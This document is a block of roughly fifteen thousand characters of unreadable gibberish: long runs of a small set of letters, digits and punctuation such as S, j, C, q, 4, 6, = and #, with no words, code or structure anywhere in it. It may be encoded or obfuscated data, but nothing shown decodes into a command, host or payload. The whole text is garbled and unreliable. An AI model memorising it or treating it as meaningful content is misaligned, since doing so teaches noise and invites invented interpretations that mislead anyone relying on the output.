n6noNJJo-S-6:=66omSJm(4CJ:#==#=oCJ-qJj(C44no:X=SjSS:SC(6mJjD6omnJ:C=qJn-CqS(=j(:m4m#q>Comjjn==(4AJm(m(Cjmnm6#4&mCJnq(:CjC4j#(Z(JSq#j(444=6%W(o#qCCmC44:-:(j((SojJ=SFM-=L#(mnj:omq6jo(oJSJSmC4-(#:m4o#SSnl-o6qJJ n(mS4:4Ci#Sm4q((nnmj#-4e4cSq4q=CC:66S#(MmSSSq:(Cm6m-JJC(m:j:(C>6g(=J4(:n:#o4(#omJoS:an#CnBo7m(4S:j#n6-n4:-=J(ov=q:J==Jno(Son6CJj2m=66m-ojqq4::64m#=f4(Sq:6oCm6:(qqJn#q:=mC-J:-=J6qSno#n=e#(%So#q:4=C4-C-jJjoSnJjn=m64mCSq(6C{jQ-:#S(SSSjQSv6mmS-om:o4SSjJ6j6(#/}1SmSqjj=C#J-6S-(D:#:4446CWSq#qonSCj4m#=q6Jmj4nH=C6SmSN=(mnS=#C_#CmnSSjSnm4S=Sg(mnomq6jC4m=m-#5C(Cq4:(=CmJ##k=o=S4j--Z6o-=^#q(C(:m=-6#EJn6qnnCC46(#-qeo(jmj#=#44mj(m(qSj:C4J66(-JFn#noC44j-jm6(JSjCmCo64#CqjnjnJ=j=nmS-:oJomn44J=0#mm4o4(#jSC4-(#mm6o6CnjjCn4S-CSq(n:(:J4J6nm4q((mS6:6mn#jmqoq:-nm:-=#-Jq6oCSo4-:Q-6J(qSn6:m6:C=66mSJo:nn(:6m:I#(qSSjqCC::do#q0nomq64RC#6n(oqjn-Co=-#(6o(6B-(bnC:nm=#=mjJ=Cojq6JmJJ=qqS-:66o=q4m(qJJ(==nj:Cqm4o#SqjS=,:o4q##m=n-qnjmC464#CJS(4:J6JC6#SmJoJ(nn4CJ#C#:--oJq4nj4#4C#nLnSSq=n#Cm6j-oSq(S:(:J4J4mm4q((o:#:4-4#=(SSjj(n-:4=-onL:SSS(4oCoG=-6Pjj6SnjC=4#(--SOqJ:m:j4##=(joSS(C4:-6j-qJJSjSS=S=J4---(#(6So:S=m64oJJ#(=n=4C4S#qm(ojCon6:m6J-C qjnSj=S=(#(-JJ#nSSq=m=#O#m6SjjCCS:p=#6sq:o=jjjS#q4qo6t-oCC-j:C46#mSb9:on(4J=C#mm6SCqjjS4#=y-COn((jCjj6j6(#.epSmS4j:=:Jom(Jo(JnS6b=##nqoqmjSSn4#=6onm:o=S(n3-q6q-JAqj6S-=4##mmo-q:j(=6:-=CJ-m4oq:/=S66--6=(JJ_C=n6C-6j-qS:(oSS:j=m6=(6J#n4nCCC=j-(m:(Jq#j4#n4-oogon=Sj4j#j)o-oSJjjnqj==##jm(qCqSnoCo-J#q #oCSCnj=(6CpmJ((#SC:CC-#(mCqJ(}Sn:C4(6moSoJ(-n-4#4C#:mjo4Cnn C(6S-#}:j=S4=C=j#j-SoJ(nnm:44CJqm6S8(&=:CSmSJS(RJa:m4SCm46-6Sn(jSq:q--6m--k#qJ=6:C4oJ-((S=jmC=4m=-o:m=o6SSjo-n6(-6S:o=:n=##mRno6no(qnn:m=6J2mtJ#(g4:C:-jJC(-n=:n=#-:6=-SS=(jS_66-JL:o6qn(n=k:o4q##m=n-q:n4C#6S#wSoon:Jnm=m64m4KwqSn44(=:64m#oS(,4oCo-(#:m4o#SSnl-o4qJJmCJ#:Sj{6m6:o=kC(q:nC;6(#Sm6x-:nSCj#mq64*#((qmnkCs6S#:(C(nq#j==44zmJJJ(:=q:--6#C(4J-qJj(C44no:zCSjqn:S=J6mJjNn(Cq&jSC-6:(6J#q#C#Cj4m#4z4S=SSj46(4m#6V6n=S#:(C=6C##JJ(ono:jC=m4m:Om(6n#:o4(#(m=nnqn=-C4m=-:qCo6qm:J=C6q(nJjnSSqC(=m##m4o4j4jSC#4C-C(:((SCCmC--#-C+n(n:SnC-(mjmoAm(o==j##Cp4(no(S(nSC#46#jq6o-j4j=#CmCJSW=o#Sm:j=oJqmSq((njJ:-447(m4oq:KjJ=J=C-4(JSj:C=Z6-)6#-dU(CSn6=C6#4-CSSjjjJ4jCm#o(=ojSjn6=J=j8m34o=qCj#-:4=mCwjj(CS:m#S4#m#S:qSjS:=4m6So#oCqnjn6S4-mJqmosC(4(=#m(-oqJ(#S=:=#C668SoJSJSmC46JFjFjn:qq=BC6m6-mq4SmS-jq=j#J-#q((mS6:6#46_m(oSq#n:#=4nJ=m:nnSo=(C=-#-4J4o1nS=#C=mj-6oS(6nm:6=C66qqoSj(n6#JmJJ6 C(Cq4:(=o4#(o;qnJq?46-o6:{JJ#q4C(:m=6#6o4J-Sjj(=(4J-#J(SCq:=j=qmJ-?qmnm:4:j#S6:.(Jpq#CS::6J##1#J4Sjj#6(6jmJ}#(#So:j=#mSmo(m(-C#4##C#So(JnSJn-C4-(#nwmo4S4nC=S64JJan(mS4:4Cz#Sm4q((<:#:6-434ojo(jJnqCm46-C(Jo6j4jC=C4jm(1:qJS6:4-n6nmmJ=j4C4CS-m#=ojon:S=S6J4#R4m-(CSn:(644-mjJ(q(SJ:#4(mCm#ojq(j(::4#-(o4o:jSjq#(m(Umc4SCq6:j=q#JJCN6qSnJCJCm#4}Jqj(6jSCJ6J#nZ4(JSCjS=S4j-mJSS#S==j=nhSoSqJ(#:4j-4C#nv(q4(-jjC(6(#JB#((:-4(6j6n#6)m(CSS=4=j6qmqq((mS-j#4JJ6mnJCq4j(:-m^#qomJ#S#jC=C4-m(JCnJSnjC=4#(--Si(yCJ:n=C#41(J-:kno4m=j64((o-j#jn#:4j-o(qq-jJ:(==46(q9jo4=ojC44-Jm#J-q-j(:n-j-qm4o:SCn-Cm4m-nSo(6C=:j-C66-moJqCnq#n4jlSmq((qmj#6S4q-jm-o(q6jn-=64m4q4qSn#:C4CA:.(oCjJn#:=4=J:U4(Jq:jj:44m#%ZR(Sq:=C=n4#-=J4oInJ:J=:JqmqS6qC=:Cnmj#=m#omSjjo-q6SJ(zoqJS#:4=C#CoCo(q4njCj-n-JDjq#q6C4Cj4q-q((JjCJ=SCE4##/S:o4:j4C-q#JQJJ(q4n=:Sm=#6oCo::j=j6(4:#4v#(Sq^6o=(mJ-qJm(6nC4J=C#o(-JmqmSjCC#mNS(jS-j64=:64--jyqj:q=:CCjg(oSJmnSq#j5-:#SrSJ=qmSS4#4C#:mjo4Cnn:=j4SoJq((#:(n4=49nm(o((:n#j(#4#jmqoqj(n6Cmm##-qJnJS4=J:z-m-41:(::jj=4(6mmme#qCnm4S4SJnmoS-q===C#mCz#MConSn4v=J4l#mJ(j-S4:q-}6oJ-qSnmC:#q=n#:tJJ-Cojo:m4oo=JJSC:4=6#6mnJ4S=(6Sj66=C#o(-S(j=C14:=:oomqonqmn6#/4=##_m(jSo6qCjm(mJoJomn44(=:64m#oS(*4o::-J#npmJ#SCnwC(6S-#s:j=q6=CC-#j-SS(jon#4S=##n(=Jqn9=q#J=6#-OjoqC:jSC-Zo#)(:o-njjS-({(m#Sj(onq:#==J-miq#q4j4:L6S2#&Co:qjj4-n4-mjPSj(CJ:##(6noJJ#(=n=#q4S#qm(ojqCjo#n4qd-To(4qC4j#j#Jo40n(:nJj-mo#qoJJmqmnqCC-J##m6J4qm4=Co64#CqjnSnJ=jC=mSmJY-(-=::6=o#SmmJ4jJn#:=4=0Cm-oJS(j4Cn!:-m(C(qSJjq-64-J4q-j:Cj6y4o6#qoJmq:4q:n-q,C(4joqqjnCm46ows#(n=ojq6>cjojST(onq:#==J-mooS(<jJC4=-o:7So-C==m6:4:(ofq(nSmj6-E6:TJJ#q#S4Cj4#W(m:(Jq#j#Co6j-#(S(ojmj-##m#JCJSn(SnCJ=-#4o(oo(:n4CS4J0jP(JIqHCm=J-C-jJjoSnJjn=m#JmC(m(qn#:m4jJomoo4q#=j6j6JJ4GnS(So4J#J-#-C(jo=nS:o=mmj-(*roPnJ:qmn6:-IJ(qCCCCS4q#(gjjoq=:(Cm6m##JC(m:Sj=4(6mmmJqqCnm4j4qWJm&SmjmC4Cj-S#:J(oGS#=S=J4---S:(CS:jj=4Jnm(J6j4C#4:##66qnJ:q=j(:s{q#:/4onSj:JCq<--4JqjESo=-#tJ:-=J6qSno#n=--jP(((qJj#=(64#-Jj((n(j:=##(mC(m(qn#:C4C64/(oCjJn8:n4C-(mmSSSJn-C--##NJC(SnSj(=m#Sm#h0qCnSCS==#m0So4jJnnCm44-4m#(SS4=(Cy-#-6q4n4:j:(#J6qmmJ6qCCJj#==6=m4J-:tno:==#-(((omq-n#=Jy6-qJ#(CnCjj4(#C>JJqq#nCCC=--(/ComjSn==(4m-m{J(CSm=j=qmJ-9qmnm:4:j#S6:H(Jbq#CSCJ=-#-q:oCqnjn#P6J#-?-j:S6jo=S6m-4qJ(#S=:=#C#SmqJ(qj4o:6=m-J,CoqCnnC6S6(m(EJ(#:Sj=C#6mmjJo:qS=4(=:-J-mo4qonSCj4m#=q6J-j4n}=C4joSqq(m:jjm=:w6-nqojn=(j-=F#Cmnn=qjnA#q4oR=m_(Cqj4S#S6moC*q(nSmj6-8#oJmJ#q#noCj#m#4m=JCq#4::^6C#jqSn(Sm=SC:m(-mt6(6=n:j=n6SmCJ4qq=::n#1#qk#J4:C=C=(m##:x=((q06q=nm(mJoJ(nn44(=m6--#oJ:6nqC#=4JC(j((jCn66j6(#d}yj=S4j:=:Jom(E+(a==:4=:#:qoo((Gn_#=44#:;:joS(joCJ6Socz#(n=o4J#Cm:-nSz(onq:#==J-m4oq:GC-6:-q#qq-J{Soj4C:Y6-CJoj-:#4J#omC-:no(qnn:m=6J_m#onConq6o-#JoqOooSqj#C=s--4Jqji:m4:#nm4-=nq(nn:CJ=-ooYoJmqo4=:_-CJC(An6:n=4-=66-jS6(Cno6-CN46o(qmjn4o:q4n#mm6nUq::JC#6##4Jj(#:(:j4J6#m#Joqjn#4S4q6=m#ojq(CCCS4o-o(JoCSo4-Cn6m-4J4oCnS:4C=66mSJo:nn:4S4qJ(((qmq4n=:C4#o:5=SjSS:SC=6mJjJ(o+Sr=m=-6qmjoJ(#C(:m=6#6o4ojqnnSCCwq#6JS(JnJnm=4#JJjJ4qSnJCJ=n#47JqCqSnoCom6##m6J4qm4=Cj4bo6m-S4:J=##J0}-oJq(#S=6-=:64m#oS(F4o:-mo6Kom(JS4jj=j46mJJjS#So:4=j#j-SoJqj:m:6#C#:(jSjj(nm4#=9-4f:(Sj#nI=C6SmSx((mnS=4=m#CmSoS(=nmCS###=ojon:S=S6J4#s4m-(CSn:(644-mjJ(q(SJ:#4(mCm#ojq(j(::4#-(o4o:jSjq#(m(tm94SCq6:j=q#JJCs6qSnJCJCm#4hJqjq4jSCJ6J#nD4(JjCjn6(6ooJqJS#SC=jC=#SmoJmnjS-4J=m#mmqoCjJS-44=g-Cmw((qOn#:di:-C(josCS4S#E6#m#Imqjnn:Jmn6:oSJqj>=n:66S-JtmSjS(nOCK-m-oJ4(jnjjS4J#jJ#h6n4n:4S4qJ(((qmq4CC:66j-qJJSCS4:S=J#J-nJ4qJ:jj64S#JTJ.mq4jJ4C4n_(OonJ:JC#CC-j#=JS(oSm=jC=#(-mJmo#nC:m#S#CR(JmqmnqCC4m_j{(ooqJjS#;4:mJa#(#q4:j=#m(((R-qjn(C(=:## (q4qjnqCqm-#mm6o6CnjjCn4S-CSq(JS=6nC:mnJ4qnj(==j6=-#jmqn:qSn-#==66:omS=:j4-:x6o-4c:j6Sq:#=C#C-jo(qC:m6=4(-(m:o#(oCC66mCR#0Co:qjj4-n4,-(JS(#S:6=C6m4--S=q(j(:J4#Jq*J(Jqnj4#S-C-n(((oCJ4J6#6CJja=qSno:m#j6qoJJmqmS#CC=--jmq(Jjjn6=S4o-mq=o=n(nD#mmmmCS((-:4:=-CzCoSoJnmnoC#4=-jomooS4jj=j4SmJJjS#nJ:4=j#j-6oJqj:m:6#C#:(jSjj(nm4#=R-4_:(Sj#n%#66SmSV((mCn:(4(6:m#Sjn4n:4S4qJ(((qmq4CC:66j-qJJSCqn=(=J#J#mJ4oDnCjn4(mC--oj(qjJ66=6-SmonJ:Jj4#S4/}#86n4:4=j=(mJ-qJm(6nC4J=q##mCoC(jj(CC#m-(H#oCSCn-=(6CJJb-S4S=4C#CmSmJ(m(on#:=4jmmmoS-qjjj:S6JJ:VS(Sq=jm#C-#-Cbn(nCH:JCN4mm(S-(4nq6g#m}(onq4(=4q:n4:-Jm-joqnjCCq6S-mcoj6SC:o--4E#6q(n-CC#o=q#nmmJ6:Hn#Cn_o#=J(omSmn#=C6m#-OM(CSn6==6mCm:SjjjC(:m=-6#dJn6q-C4CC6C#-J(S4Sjjq=qm(mo%:(4nS:J#j#(-5JdnmnoC44j-jmS(JSjC#=J64-jJjo6nJ:j6m66JCJ:jjCj4(=mm#-/o4q:jS4#=<-C;S(Sq(jm=S-4-mJC(SnSj==m#SJ#J=njnn6S-SUJm#q4(-jCCn6(,4m-n=S(:(CJ6#oqJJqJSn:4-SmCmnq(qo=J6J###CojJ=SSjoCm-j#=J(omSmn#=C6mJSJCq(Sm:m=q#CmmqjqqCJ:d-mpmo4ojjSn:=(4<-#(So:Cqj#=#44mjq-(4n4j{4S1mo(J8n#n664-4>j)(SJqqjmC66CJJ&q(#SC:CCj#(mC(mq(n#:C4C6-}(oCjJn-444=JC(CSSSJCmCo6#-=JjSmSo4-=j#j-SoJj:nSCS==#m(Cq#(Cnn:n4j#=q6J-qnnCCm-m-41=oCS#6:C*#CmSoS((nmCS#4#m?CoSSSn=Cm6S5#s=SjSn4S#SmJ-#(4o-nC:n4(m4--ojq(j(:J4#-(oCo#Sjj(=(4:-#J(S4S:=S=q.(o((m(4:Cj64j#q^JqC(6=:CJ6J6m?4noqmjmCq6Co((j(q:Jj?#mmmJ4JjnSS:C(=5##oSJ:SJn#C#=4-jO#S(Sj:JC#6#-oJj(#:S:o6m6-o#q#nCnS4(=n-Jm-o4j(nn#o44-4mC(S:6jC=C4-m(q#nJS-=4==*CoCqSqJ:m:o4##=2jqmqoj4Cj6j#SJJ(jj#:J=46jmjY6qJnj=m=6mCm:SjjjC(:m##6<e4o:SSC#:Im6-SJSo(Sm4n=(#(-:J#jj:4:j=q#q(-Jm(6n6#n4j#q*qn-qmn-:#6Jo6KC(oC-nL6-m(J-qS:oSq:n=m66(3J#qn4o:q-or6(qnGqojqC#4=o-}4(qCM=-#=4qJ49=:qSn::4J6-qooo(mno#=46vC(:S=:6=S#o!=-6xjj6SC:o--m6on_onCS:#o=q#nmmJ6:gn:=J4#-#m4(jS#=(C:#J-#J#(onj:#-4#JIJJ(q4C(Co=:#4_SoJjjj(:24DNmQo(4Sj:jCS#Jmj(#(on4:j4j663JojjmnoC44j-jmC(JSjCmC-4q-jJJo#:(jmC666J4Jj(nSS:Cmq660SoJSJSmC46J jm6(SSJ:JCn64mJqCo6nS:J4J6(m4oJnCnS:o4oJ6m#J6(4nm#=4j#*q6J-j6=n6#t=#6k-(jSq6:=o6SmjJm(==6:n-6#m(:JnjSn?:#=}o:mmSj:=4q#S!6--aCj-S4:q-}6jJ-SSjq=-jE4o#4m:n6q6nC:67q-q((nq:j4n6.mn(qJn(J=n:(=6J:o-Wnn#nJ#n=:#=,(JgCqn-6(6JmJmm(4:(nx6#6om4,MqS:#::=S6:(roJnmnn6#-#J:m:ntSon#-o4-JGm-oCqmC/=j6=Jj(6j6Sn6q=:-Jm#o4:Snm:646Q4;=JQS(j#CC-m-4p:(::jj6#J6mmmh#qCCJjv#4#o(Co::(=S6J46#Cm6jqSS=(C=ms#ES:(=SS6=4JmCmJojq(=J::4#aSm:(Jq#j46J6SEm94o:S:=j=qmJ-&qmnm:4:j#S6:L(JLq#CSCq==##tjo(jCjSCo6oJJ #o6q4jm-=6qJCJjqjSSCJ#C6no(J:SJnnC4-(#-m4J-Cnjj6S46o(q(n-q-6n=:6((:JqjnSqjm=Smnm#Jcn#Co#o=6J=m-(jS(:J#46S-oJonJS#j===JqmSJoqo=6:#=664mmn=qoj4Cj6j#SJJ(jj#jo=46jmjr6qJnj=m=46:m:noq(S&:zm=#4m=JCq#4:CS4-o=m6S::q=C-:4=-6JS(o=n:(=6J:-=qnn#C:4-m66-m3oCqn4=:-6J#6_#(jq=6q=J6=(nq(joq=4JC>J=-6J-qjnq#:4=#Sq=J-SJn::#4n#+Sqo6nS:J4J4mm4oJ(mS6:6mn#=-ao(q#nC4m44#:7:Sjq6nm=J6C-qSno::jj=4(6mmm!#qCnm4S4j-(mmomqqjCCm-j-q(Jo^:m=m646jJSg:q(S_:##S6:VJJ#q#S4Cj4#{(/S(Jq#j#Co6j-#(S(ojmj-##m#JCJSn(SnCJ=-#4o(Jnqmn4C4=C-Sb4SJqnjmC464#3JS(4:(j!6#66o4q4njn(4J=q#mm6oCjJS-444C-Cmj((q::J:-64JJhn(mq6:C-q6qm#z=jCCCC(-##:oSoq:(=(4m44BCm6(jSq:J6C46mSJJqJqm:44J#C-6oSqJjJ:n44-JOjq#qoj4Cj6j#CJJ(jjmj66C6:ojqjn(Sm=#C<#4m:oSn#n=:Sm=6-GJJ:(#nn: !q-SIo(o:Jn#C=4=-4a-jrSoj=C##(o(Jm(-S#CJm6#nmCo4S(n-#N4oJJ%q(#SC:CCj#(mC(mqJn#:C4C6-+(oCjJn-444=JC(CSSSJCmCo6#-=JjSmSo:4=j#j-SoJqj:#:m44#j_jJ6SJjj4m46+C1:nj:j=(Cm-##!J4(:nS=#CU#CmSoS((nmCS#46x9CoSSSn=Cm6SU#Q=SjSn4S#SmJ-#(4o-nC:n4(m4-:qSq(j(:J4##o<4J:SSC4:d6C#nJ(n-q-:jCqP(o(J#jjno=m=-Z#o#qCqSC(:n6J#-54S(qnjmC464#CJS(4n(jn=m64m4NWqSn4CJ#j66>SoJSJn(C46JNCtnS(So4J#J-#-C(jo=nS:o=mmjmqwm:qS::4=o6j-lJ=:-nm:64694%joqSq4-Cm4-##JJj6SC:o--m6ooq(nCS:#o=q#nmmJ6:ejo:#&o#n9CJfqSn-C:>6-#1=(=:C:S=q6(mjno(6SmCJ4C#qqnojjSj(=(4J-#(So=q#jm=j6o(qJnn(S:CJ=##4o(J-(4S-#n4j%S!(n(:(=-:-Dn-:5(j:Sq4nCq4m-S(n(#ST=##oJom6S=(-jjC(6JJ4<SooSo=JC#4=-=Sq(SSo:o-66#-=J=:qnS:o4oJ6m#J6(4nm#=4j#.q6J-j==:6#9=#6%-(jSq6:=S6-(=D6n:CS6Jm:6=m6oSqo4nC(46o:(jnJj6=(CoL6#-Qr(CSn6==j6)(6q4jSCJ4j=nJfmooqq#n=#-4n-mH4(4qC:S=4Zno4(m(4S=jC=#J:moJSqjnm:=m66mo4oCSCnj=(-4#3x((SS#j:-=46JCB-qjSS6(-o##oSJ=(#nmCj4ooqm=S(q::J:m64o(m%SmSo:4CC#SJ4}-nCnJ:=--6:oqS::SSlCo44#:q6oCSo4nCq--J(0:qJqm4####j(JA6(-nj:qm:#=ojoSSSn=Cm-j#=J(oJ:m=#=C-m-o(#(CSn:n-X#J-IBmq(nS:-mo6lo:qmqqj#:4mCJCJ(n#q:j==(4A(qJnn(nJCJ=n#4o(JnqmS#64-C-So4J-jCjSCo6oo6X#o=S=6q=S6q-(Jj:oSm::mq6n-oqCjS=J#:==#6hSooCnn=C#4:-CJ(onC&j#=nJooJqCon:#j6mn6:m=o((H4qCn4Jonm=o#qqnCCo46obe:qJS#:#C4#jm#J4(:n:#o4n66mmoCqSC4Cj4q-q((o:q4j#=S4O(o>qjoS-4-=nm4-:qSq(j(:J4##oH4J:SSC4:F6C#nJ(n-q-:jCq!(o(J#jjno=m=-Y#o#qCqSC(:n6J#-&4S(qnjmC464#CJS(4:J:S=m64m4}PqSn44(=Hm#m6S4j4CjC(-J#q&mo6SC=JCq6#-CJCojn(:C6m#(m#JCqCS-C(4C.Jm-q4q==C6C-S-JomooS#j==j-m-oq-(jnjjS4J.:mSoS(=nm6C###=ojon:S=S6J4#)4m-(CSn:(644:JSJ(q(SJ:#=o#4-:oSn4ShCC=n-((-J-Sjnq#(m(-#qj(ojmj-##m#JCJSn(SnCJ=-#4o(J-n#n4C4=T-So#oqjjn6=S4k-mK6oCq66q=Sm(-aSJjJC6:C4C64 (oo(#4o:--J#=(6noq::JC#64J(*mo6S6=4C-#jm(o((Jn#C(#C#oojoqjJnb6m-m54&jSSq::(Cg6#JSEoSmS#:#C4#j-6oS(onm6===-(-WSmjmjC#(=##=m=o4q-4HCo4=##J(n(Smj-C##J(6J-(C=-:o4S66mJJ=qq4::;6C-SJSo(Sm:S=(4*-tS=(4S:::mo#(-aJf:=n4:==C##q:oSq-4=:6-:Jn(Cj:q=j6=S6o(nJ((6=:j=#nm#o=q-:6S-:}4C#nq=o=qjn=-o6CJJ(RnoCq=-#SJomqwm:qnJ:=mnwS(Jq=(=4q:n4:-Jm-joq=:(Cm6m##JC(m:Sj=4(6mmmJqqCnm6#4(-(mSo#jSjq:=4#-j!(SCSSjo=omJ-n8C(4n(j--36ooWQ9j6n:6:=4Jqm6S9S(C#:86C-SJSo(Sm:S644BmCJSqSS=:m4Sm#m=qjqn=S6S-J##o4J-SCjn=(-4#-Jj((n(jJ=##(JC_-qjn(C(=:##f(q4q:CSCqm(J(omo4jCn6=j6qmJ(Con:(:J4J4mm4+WqCSnC(#C6-^jJqSJ=6:66S#oqJnJS44SCG-#-6q4n4:j:(#J6qmmJ6qCCJ:q4##C0CJjS(jC4m4q-#5C(Cq-:(=CmJ--(4(=CC4C#S#JJmJoq#n=Cj#m#6mjn6(ej(:==m#:Zojnq-:j=(#(-JJ#q(nJj-=-J:m=qjqn=S6S-J##o4J-SCjn=(-4#:(S((n(jJ=#mS-q(mojq44(=-64--nnqjCS6jmooJPonOSon#-o6oJJ+6(mS4:C#J66-CU6:qnS4(-n2b(moo:-na:4mL#jomo6S#jC=j-m-n(Co#nj4j4JmCm4q((jjJ4N44Z(m4oq:An64m-S#=q-((q6j6-n6#Jq(4o==qjn=:#J--no(nj(CS4#X(m6(JS(j46(4S-m(m(Cjmn.6#6C-nJnnSnJj-=-m#mCJnqnCSCo#m#-(#S#jCjS6(4nmJ+-(4:(jx6#64m49%qS:#:6=o#SmmJ4jJn#:=4=kC<Soqq(jj-o46#mJJ(CSq6nC:RnmoSo(=C-:J-=6=(noCj(nnCm44-4mC(SS4=JCn6m-4J4o;nS:4#(6,J#J6j4C44j4(NJmqomq6jC6J4q-#yC(Cqj:(=C-m-qJ#(CnCj-4(#CoJJ-n4n=6C-C?SVJqmqoj#C=6jsmm6SCSj:jCS#J-nJmo6nC=m=q##-=oj:onoC4=:Jj(j(J:4jn6(6ooJqJS#SC=jC=#SmoJmnjS=C(=m#m-#oCqmCS:=6(#mimoqSCjm6j6qJJRvnm:m=4=jmS-:o((Mn#4S4o6#qoJnqCSf:S=-#:q6oqS#jC=C4jm(JC(jSq:q--6/J#J6j4C44j4(sJmqomq6jC6J=-T4GC(Cqj:(646nJSm#oJ:C:q=J6q(6J#n4C#6:mj#:qno:q(4:Cq-j-oJS(JSm=j=o4m-oS=(4:C46-nJSmqnqqnnJ#n=#hSm-((qmj#6S4qsmK((#:#:j6m#JJCv#qjCnCJ#C#Jm=nn(=CS44=0oq^CooSo46=(-=JJmLj=q6j-=j6q(:J:qCn4C(#C6=vjoCSJCC:46SJS2mSSSo=(Cm46-6(4(jSq:q#(6m-6J6n4n:4S4qJ(((qmq4CC:66j-qJJSCSn=(=J#J-nJ4n(Smj6=6JnmjJn(SnC#q4J#=qnJ:(qC46:-9o=m6o-Sjjq-:46-mD=(4nSj:mo6mm:nq(nCq4/-(oomqonqmn6#A4=##Em(jSo6qCnUqmjqi(::#::=S6:(&Jjnm=o66-=oqinoJCnj(C6i:J#(:o4CLjo=q6#-=S-(4nq6L=jm7oSSn:-SsCo44#:q6oq:djC=C4jm(q=(jnjj64JM4JmJ6nCn:6j-j0(mmq#(cj4C:6Sh#gCo:qjj4-n6(-6S:n=:nj4-{6omqJ#(==-:nmo#4v4JCSS=6CC6C#-J(n#:Jj-646=oCqCnSnJ=m=o##m=ojnmn4:==C##q:J=jjjS=S4(-m(j(C:Jjn=m46mCJonSS=C(CwUmo-oCjJnCComn#=o6S*:#n:C=6(#ISq(JS=4-=#mq-=o(oKCm4m4CJ(--J>qCnn#=46vC7j(jq6:J6C6S-q;((j=oj=4(4yomq#qC:mC(###Cmnon:tjJ:+=m-(NSo-Co:J6=4-mjHqj(C(:#-j6omqJ#(==-:B###4x4J&SSC#CC4:#j.4jnq-:jCqk(oJJ#n(nj4J=#6=m=nqqSnoCom6##m=o=CqjSCq4(-jSoomS:6q#Cmo-jS6o-S8:C=nJ=moo4qjjj:S6J-jo#JS(C=JC--4-=qCnC:S:J6m6om#J=qj:m:4==6Cm#n:(0=6CS6S#(9mnnS(:(C:6#oj(4(::S:q-(g(JmJ4nCS6Cj4q-JoCoSqojo#64##=3=jqSSjo=oN6-khn(Cn(jm#S#J--J-n#n::S=:J8moqm:o=66#dq-n!JjnS(j6#4m6J:(#o6=nj:==#(-inqqqnJ:qm6#(o4S#:q=-6jm(o6w-oCC-j4=q!p-o(kjJ=:j==6#Smonn(-==C(6(#JM#nqSJ:JCn64oS(C(n:(:o-JrJJ#JCnjS=CS4o#mojon(6nmCC4SL4;joqSq=(Cn6m-4J4oCnS:4#J#SmmJ4q4SACS44{(%oJ:q4jSCJ-j-(mwoHjmj4C=4C-#S:ocnC:S4S6(mmoSn4nmCC4S-Sm=omSSC#CC4n-nq>(Jq-j--:4C-nOn(jS=66C-6n-CJmnmn4:==C##q:o:qSn:#H4oemqon6:#6q=n6J(nJ((6C446#:m#-6nn(:n=C(=aoq1qoJqq46C(-4J#qqn-:j4(-66--CS-(4nq6E=oma(Jn:(=n6CS4oonm-n=S(:(CJ6#oqJJqJSn:4-SmCmnq(qo=J6J###CojJ=SSjoCm-j-nm6omSCjS646j-qJqn(Sn:m=4#4-CoSq4CJCS4m#4X4JdSSj46(6o#:94(SSJ=j=(4v-F(m(4S=jC=#J:-ToCqSjS:(4m-So4omSCjS=S4=-mJSS#SCjn=n_BmJe-(-=::C=n#n(;oJ(-n-#:4C#nVnnQSJn,:m6(o-X4(qC<jo6-m6oSS-ocno:4=:J6mCoo:-SR46-(DV(njoqqjnCm46obh#(n=ojq6Rmjoqq4:nS::=4(69qqoqqJnq#64-d4(=S#:-==6rY6--zCj-S4:q-sm_onIqn4S=#q=n#:rJJ-Con==(4m-mm#(CSm=S=j#(-mJm(qnC:m#j#n-6JmqCnS444j#qRqS(qnjmC464#CJS(4:Jjn=m64m4tBqSn4C(=m#mmJoCqmCjCn=6#mRCoSj4jjCq6qJ(Pmo-q#:J-66qm#JCqCSjC(4Cmmmqo#qCjC:-6(-CJJo#S#nm=j6#JSJJo-S-6:=C6:-jJ4:nn(:6m:<:(qD6j(no#6=-#!.ConC=j=Cj4=(oOCnJ:^4S-qm#oqnoqqSm#q4J#=qnSnj-S=6J=lo=m6o-Sjjq-:6o-SJj(mS=66=-m4mCoC(jj(44=V#(eSo#q:4=:#-C#-Jj(qnJ=C=q6J-qS6(#:4:=-C}C(qoJSJnnC44=#Sq=on::nnCJ4j,:.m(ojm=q-q4mo6)ZqCnSC(-##jmqoqj(jo::44-S!JSjS(n_Cb-m-oq-(jnjjS4J!:mSoS(=nm6C###=ojon:S=S6J4#>4m-(CSn:(646#mjJ(q(S::#4(mC--ojq(j(:J4#-(o4o:jSjq#(m(Wm/4SCq6:j=q#JJCJ4qSnJCJ=n#40Jqj(6jSCJ6J6m74(JjCjn6(6ooJqJS#SC=jC=#SmoJmnjnCC(=m#mmqoCqmCS:=6(#mTmJ#SCjm6j6qJJ Onm:m=4=jmS-:o((vn#4S=:Jqm#o#(4jj6-44-4mQ(S:m=(CY-#-6q4n4:j:(#J6qmmJ6qCCJ:q4##COCJjS(jC4m6(-#,C(Cq-:(=CmJ--(4(=CC4C#S#JJmJoq#n=Cj#m#o(-ojSjnS=Jm:-SJSo=Sm4C6#66-oJS(mS44J=#6=m=qCqSnq:(4joom6JmSJjCCq%n-:(S((n(jJ=#mS-=;#(mnj:omq6jo(J:SJn-C4-(#-m4J-Cnjj6S6qo(q(n-S4:4CU#Smq/m:qSO6oC064mJqoqCn64C#-J-mCnnq=:(Cm6#ojJJo-S-=#=C6nmnS{qJS-:-m:#Cm:Jjq44nC(46o:(:n(j-n6-n4:-=J(oR=q:J==Jnonqmn=S=#q=n#:_JJ-Con6:m6J-CVqjnS#4nCCm(--}4o-=nj:#SD:(oq0:=n6:jm6#CHon-:(C66(4oo6m-ovSCjn-=6j-cS6jJ:=j=mq6nm:oJ(-4o:=6(#m*mJ#SCjm6S=##J(C(n:(:o-J_JJ#JCnjS=CS4o#mojo(qonJCSmv#:qqo#S#n4=jm--4J4oHnS4m#(6^J#J6j4C44j4(>Jmqomq6jC6J4##=O=jqSSjqC(6j(owm(:=q4j#o6o(68-(FnC:nm=#o(-ojSjnS=Jm:-SJSo=Sm4C6#6=JjJnjSCS4J=#m4--oCqnj(444j#nmSoCCqjJC=Bn#:(qn4:#6qCn6:mJY-:onojm=oJ=m=qCj4=J66-nP#q=o6qj46CC6oo-(hS6q66nC:6=m(/f:qS66:4J-J-mo4:onmCm4q-Cq(SjSq=JCZmmJm(4(j:Sj:4(6vm#qSqqS=:#4j#(oCoSqojo6J6( 